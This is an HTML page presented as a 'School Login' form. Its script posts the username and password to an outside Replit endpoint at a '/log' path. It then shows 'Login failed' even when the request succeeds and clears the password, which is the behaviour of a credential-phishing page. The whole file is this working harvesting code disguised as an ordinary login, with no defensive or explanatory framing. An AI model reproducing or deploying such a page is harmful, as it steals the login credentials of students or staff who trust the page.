<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>School Login</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #1a1a1a;
    color: #eee;
    display: flex;
    height: 100vh;
    justify-content: center;
    align-items: center;
  }
  form {
    background: #222;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 0 15px #0f62feaa;
    width: 300px;
  }
  input {
    width: 100%;
    padding: 0.5rem;
    margin: 0.5rem 0 1rem 0;
    border-radius: 4px;
    border: none;
  }
  button {
    width: 100%;
    padding: 0.6rem;
    background: #0f62fe;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: bold;
    cursor: pointer;
  }
  #message {
    margin-top: 1rem;
    color: #ff4c4c;
    text-align: center;
    min-height: 1.2rem;
  }
</style>
</head>
<body>

<form id="loginForm">
  <h2>School Login</h2>
  <input type="text" name="username" placeholder="Username" autocomplete="username" required />
  <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
  <button type="submit">Login</button>
  <div id="message"></div>
</form>

<script>
  const form = document.getElementById('loginForm');
  const messageDiv = document.getElementById('message');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const data = {
      username: form.username.value,
      password: form.password.value
    };

    try {
      const response = await fetch('https://a5a10927-cfe5-47a9-be9b-72a073c3766a-00-2bp4xmv4d44nm.pike.replit.dev/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      if (response.ok) {
        messageDiv.textContent = 'Login failed. Please check your credentials and try again.';
      } else {
        messageDiv.textContent = 'Server error. Please try again later.';
      }
    } catch (err) {
      messageDiv.textContent = 'Network error. Please try again later.';
    }

    form.password.value = '';
    form.username.focus();
  });
</script>

</body>
</html>
